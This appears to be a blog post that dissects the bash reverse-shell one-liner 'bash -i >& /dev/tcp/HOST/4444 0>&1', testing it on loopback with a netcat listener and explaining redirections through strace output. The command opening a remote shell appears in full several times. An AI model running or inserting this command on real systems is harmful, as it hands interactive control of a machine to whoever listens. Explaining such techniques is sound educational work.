Yesterday I saw a message from [Bryan Brake] on one the of [BrakeSec Slack] channels:

> This is a pretty bit of bash scripting *bash -i >& /dev/tcp/192.168.8.198&#x002f;4444 0>&1*

I knew that it‚Äôs a reverse shell&#8239;---&thinsp;a tool that connects from the target computer to you (hence the ‚Äòreverse‚Äô) and allows executing commands on that machine (‚Äòshell‚Äô). But how does it work?

*Skip to the [Summary] if you just want the answer.*

## Setup

Bryan than mentioned that is supposed to be used in conjunction with a [netcat], which is `nc` or `ncat` depending on your version, listening on port `4444` running on the computer with <abbr>IP</abbr> `192.168.8.198`:
```
$ nc -v -n -l -p 4444
# -v ‚Äî be verbose
# -n ‚Äî do not try to inverse lookup IPs that connect to us
# -l ‚Äî listen
# -p 4444 ‚Äî port to listen on
```

I didn‚Äôt want to run my shell over the open Internet, so I replaced `192.168.8.198` with the loopback <abbr>IP</abbr> `127.0.0.1`:
```
# (1) run in the first terminal
$ nc -vnlp 4444

# (2) and then in the second
$ bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

And it works! Now let‚Äôs figure out one peace at the time, starting from `bash -i`.

## Interactive Bash

According to the [Bash] man page (`man bash`), option `-i` means that the bash is forced to start an _‚Äúinteractive shell.‚Äù_ The _INVOCATION_ section explains that non-interactive shell will not execute its startup files: `/etc/profile`, `~/.profile`, `~/.bashrc`, etc. It also says that Bash starts in this interactive mode automatically when there are no non-option arguments (unless you pass a command to execute with `-c`) and when its standard input and error streams are both connected to terminals.

{{<lead>}}So why would we want an interactive shell?{{</lead>}} I think, just because it will be more like shells that we‚Äôre used to&#8239;---&thinsp;with default aliases, correctly set `PATH`, and a [prompt].

{{<lead>}}Ok, and why isn‚Äôt it interactive right away?{{</lead>}} Those angle brackets that we have in our command typically used to redirect standard streams; they probably make Bash think that it isn‚Äôt running in the terminal. Let‚Äôs look into it.

## Network Redirection

Redirection is a feature available in most of the shells that allow you to change where command‚Äôs output goes, and input comes from. For example, this will write the directory listing to the `dir.list` file:
```
$ ls -l > dir.list
```

A quick search through the good old man page reveals that `>& target` is just an alternative form of `&> target`, which in turn means `1> target 2>&1`&#8239;---&thinsp;redirect both standard output and standard error streams to the `target`.

At this point, I made a mistake thinking that `>& /dev/tcp/127.0.0.1/4444` is merely a redirect of stdout and stderr to some special file `/dev/tcp/127.0.0.1/4444` that automatically opens a <abbr>TCP</abbr> connection. Everything is a file on Linux after all, right? This can even be ‚Äúconfirmed‚Äù by redirecting the output of simple `echo`:
```
# (1) don‚Äôt forget to start listening,
# since nc will quit every time you disconnect;
# I‚Äôll omit it in the following listings
$ nc -nvlp 4444

# (2) it works!
$ echo hello, world > /dev/tcp/127.0.0.1/4444
```

But then I‚Äôve tried to do the same thing from [<abbr>ZSH</abbr>][ZSH]:
```
$ echo hello, world > /dev/tcp/127.0.0.1/4444
zsh: no such file or directory: /dev/tcp/127.0.0.1/4444
```
{{<lead>}}Why doesn't it work in <abbr>ZSH</abbr>?{{</lead>}} It turns out, it could be a special file, but I think this isn‚Äôt supported on my Debian, so Bash just emulates them, while <abbr>ZSH</abbr> does not.

Now for the most confusing part.

## Sending your stdin to stdout

That‚Äôs exactly how `0>&1` reads to me. What does it even mean?!

At first, I thought this is needed so that the server, i.e. netcat side, would see its input back. I‚Äôve tested my idea by removing it from the command. That broke the ‚Äòshell‚Äô part of the reverse shell: now I could see commands and their output on the server, but couldn‚Äôt execute anything! You should play with it; it‚Äôs kind of a weird setup:
```
$ bash -i >& /dev/tcp/127.0.0.1/4444
```

At this point, I remembered about this tool `strace`, which allows you to see the kernel functions called by the program. Inspired by the example of [Julia Evans], I wasn‚Äôt afraid to try it. üòÑ

### Investigating with strace

I didn‚Äôt know what system call I wanted to find, so I just ran it without any filters and saved the full output to `strace.out` file:
```
$ strace -f bash -c 'bash -i /dev/tcp/127.0.0.1/4444 0>&1' > strace.out
# -f ‚Äî makes strace follow the child processes created
# I wrapped my command in 'bash -c' so that redirections
# do not affect strace itself
```

Then I used `grep` to find the line with a string ‚Äò127.0.0.1‚Äô in it:
```
$ grep --line-number '127.0.0.1' strace.out
1:execve("/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/44"...], 0x7fff7df714d8 /* 57 vars */) = 0
200:[pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
```

First hit isn‚Äôt interesting, it‚Äôs just `strace` executing our command. But the second one looks promising. Here‚Äôs it with a couple more lines around:
```
199: [pid  5106] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
200: [pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
201: [pid  5106] dup2(3, 1)                  = 1
202: [pid  5106] close(3)                    = 0
203: [pid  5106] dup2(1, 2)                  = 2
204: [pid  5106] dup2(1, 0)                  = 0
205: [pid  5106] fcntl(1, F_GETFD)           = 0
206: [pid  5106] execve("/bin/bash", ["bash", "-i"], 0x2485008 /* 57 vars */) = 0
```

* According to `man socket`, call to `socket()` returns a file descriptor (fd), in our case, it‚Äôs `3`. Then `connect()`, unsurprisingly, connects a socket identified by the fd to the given address. Ok, so after first two lines we have an open socket to our server.
* Again, consulting with `man` reveals that `dup2(3, 1)` on line 3 will close fd `1`, which is our stdout, and create a copy of the socket (fd `3`) on it. _‚ÄúAfter  a  successful return, the old and new file descriptors may be used interchangeably.‚Äù_ Now we close `3` since we don‚Äôt need the original anymore. Great, so it looks like the `1> /dev/tcp/...` part is done in four syscalls.
* On line 203 `dup(1, 2)` does the same thing to our stderr: closes original and make a copy of socket to fd `2`. We‚Äôre done with the `>& /dev/tcp/...`.

Only after meditating on line 204 for a while, it clicked for me: I was completely wrong about redirections! Using them is *not* like connecting tubes, even if it typically looks that way. Both `>` and `<` are *value assignments!*

When you do `ls -l > dir.list` you are not somehow ‚Äúsending‚Äù the output from `ls` to the file. You‚Äôre assigning the file `dir.list` to the standard output of `ls`.

This also explains why you can put redirections wherever you like around the command:
```
# these are the same
$ ls -l > dir.list
$ > dir.list ls -l
$ ls > dir.list -l
```
But the order of redirections relative to each other matters:
```
# stderr := stdout
# stdout := file
$ some_cmd 2>&1 1>file

# stdout := file
# stderr := stdout (== file)
$ some_cmd 1>file 2>&1
```

When you execute `0>&1`, you are assigning to stdin the stdout‚Äôs fd, which is at that point a socket. There‚Äôs almost no difference if you do it the other way around `0<&1`&#8239;---&thinsp;that‚Äôs still `stdin := stdout (== socket)`. The only difference is that `>` checks if a target is available for writing and `<` tests for reading. Our socket is bidirectional, so it passes both.

## Summary

When you execute `$ bash -i >& /dev/tcp/192.168.8.198/4444 0>&1`

* first, Bash will (somehow?) check if special files `/dev/tcp/<host>/<port>` are supported by your <abbr>OS</abbr> and if they aren‚Äôt, it will emulate them by opening a <abbr>TCP</abbr> connection to `192.168.8.198:4444` for you
* it will also _reassign_ all three standard streams&#8239;---&thinsp;stdin, stdout, and stderr&#8239;---&thinsp;to the socket with this new connection, so all the output will go into, and input will be read from this socket
* then it will start a new interactive Bash session
